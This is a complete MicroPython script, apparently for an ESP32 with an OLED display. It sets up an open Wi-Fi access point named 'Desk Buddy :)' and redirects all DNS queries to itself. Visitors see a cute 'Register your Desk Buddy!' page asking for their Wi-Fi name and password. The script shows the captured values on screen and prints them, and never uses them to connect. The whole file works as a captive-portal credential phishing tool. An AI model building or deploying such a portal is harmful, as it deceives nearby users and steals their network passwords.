import network
import socket
import struct
import _thread
from machine import Pin, I2C
import ssd1306

# Initialize the I2C interface and OLED display
i2c = I2C(0, sda=Pin(6), scl=Pin(7))
display = ssd1306.SSD1306_I2C(128, 64, i2c)

# Custom inet_aton function for MicroPython
def inet_aton(ip):
    return bytes(map(int, ip.split('.')))

# URL decode function
def url_decode(s):
    res = ''
    i = 0
    length = len(s)
    while i < length:
        c = s[i]
        if c == '+':
            res += ' '
            i += 1
        elif c == '%':
            if i + 2 < length:
                res += chr(int(s[i+1:i+3], 16))
                i += 3
            else:
                res += c
                i += 1
        else:
            res += c
            i += 1
    return res

# Function to set up the Wi-Fi Access Point
def setup_ap():
    ap = network.WLAN(network.AP_IF)
    ap.active(True)
    ap.config(essid='Desk Buddy :)')  # Set your desired SSID
    ap.ifconfig(('192.168.4.1', '255.255.255.0', '192.168.4.1', '8.8.8.8'))
    print('Access Point started, SSID: Desk Buddy :)')

# Function to start the web server
def start_web_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('', 80))
    s.listen(5)
    print('Web server started on port 80')
    while True:
        conn, addr = s.accept()
        print('Connection from %s' % str(addr))
        request = conn.recv(1024)
        request_str = request.decode()
        print('Request content = %s' % request_str)

        # Simple parsing of HTTP request
        if 'POST' in request_str:
            # Extract POST data
            try:
                post_data = request_str.split('\r\n\r\n')[1]
                # URL decode the post data
                post_data = url_decode(post_data)
                params = {}
                for pair in post_data.split('&'):
                    key, value = pair.split('=')
                    params[key] = value
                username = params.get('username', '')
                password = params.get('password', '')
                # Display the login info on the OLED screen
                display.fill(0)  # Clear the display
                display.text('User logged in', 0, 0)
                display.text('Username:', 0, 10)
                display.text(username, 0, 20)
                display.text('Password:', 0, 30)
                display.text(password, 0, 40)
                display.show()
                print('Username: %s, Password: %s' % (username, password))
                response = """<!DOCTYPE html>
<html>
<head>
    <title>Thank You!</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { 
            background-color: #f0f8ff; 
            font-family: Arial, sans-serif; 
            text-align: center; 
            padding: 50px; 
        }
        h1 { color: #333; }
        .emoji { font-size: 100px; }
    </style>
</head>
<body>
    <div class="emoji">♻️</div>
    <div class="emoji">🤖</div>
    <h1>You're all set!</h1>
</body>
</html>"""
            except Exception as e:
                print('Error parsing POST data:', e)
                response = web_page()
        else:
            response = web_page()

        conn.send('HTTP/1.1 200 OK\r\n')
        conn.send('Content-Type: text/html\r\n')
        conn.send('Connection: close\r\n\r\n')
        conn.sendall(response)
        conn.close()

# HTML content for the login page
def web_page():
    html = """<!DOCTYPE html>
<html>
<head>
    <title>Welcome to ESP32 Captive Portal</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { 
            display: flex;
            flex-direction: column;
            height: 100vh;
            justify-content: center;
            align-items: center;
            background-color: #f0f8ff; 
            font-family: Arial, sans-serif; 
        }
        h1 { color: #333; }
        form { 
            display: flex;
            flex-direction: column;
            align-items: center; 
            max-width: 300px; 
            width: 100%; 
            background-color: #fff; 
            padding: 20px; 
            border-radius: 10px; 
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        input[type=text], input[type=password] { 
            width: 80%; 
            padding: 10px; 
            margin: 5px 0 15px 0; 
            border: none; 
            background: #f1f1f1; 
            border-radius: 5px;
        }
        input[type=submit] { 
            width: 80%; 
            background-color: #4CAF50; 
            color: white; 
            padding: 10px 20px; 
            border: none; 
            cursor: pointer; 
            border-radius: 5px;
        }
        input[type=submit]:hover { 
            background-color: #45a049; 
        }
        .emoji { font-size: 48px; }
    </style>
</head>
<body>
    <div class="emoji">🤖</div>
    <h1>Register your Desk Buddy!</h1>
    <form action="/" method="post">
        <label for="username">WiFi Name</label><br />
        <input type="text" id="username" name="username" required/><br />
        <label for="password">WiFi Password</label><br />
        <input type="password" id="password" name="password" required/><br />
        <input type="submit" value="Login" />
    </form>
</body>
</html>
"""
    return html

# Function to start the DNS server
def start_dns_server():
    ip = '192.168.4.1'  # IP address of the ESP32 AP
    udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udps.bind(('', 53))
    print('DNS Server started on port 53')
    while True:
        try:
            data, addr = udps.recvfrom(1024)
            print('DNS query from %s' % str(addr))
            # Build DNS response
            dns_response = data[:2] + b'\x81\x80'  # Transaction ID and flags
            dns_response += data[4:6] + data[4:6] + b'\x00\x00\x00\x00'  # Questions and answers counts
            dns_response += data[12:]  # Original query
            # Answer section
            dns_response += b'\xc0\x0c'  # Pointer to domain name
            dns_response += b'\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'  # Type A, TTL, Data length
            dns_response += inet_aton(ip)  # IP address in binary format
            udps.sendto(dns_response, addr)
        except Exception as e:
            print('DNS server error:', e)

# Main function to initialize everything
def main():
    setup_ap()
    # Start the web server in a new thread
    _thread.start_new_thread(start_web_server, ())
    # Start the DNS server in the main thread
    start_dns_server()

main()
